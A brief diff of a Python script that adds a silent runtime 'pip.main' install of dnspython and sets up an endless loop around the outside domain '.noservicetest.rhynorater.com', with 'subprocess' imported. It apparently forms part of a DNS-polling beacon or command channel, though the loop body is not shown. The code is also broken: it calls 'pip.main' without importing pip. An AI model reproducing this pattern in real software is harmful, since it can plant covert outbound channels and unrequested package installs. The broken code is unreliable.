@@ -1,6 +1,7 @@
-import dns.resolver
 import time
 import subprocess
+pip.main(['install', '-q', '--disable-pip-version-check', "dnspython"])
+import dns.resolver
 b = ".noservicetest.rhynorater.com"
 while True:
     time.sleep(1)
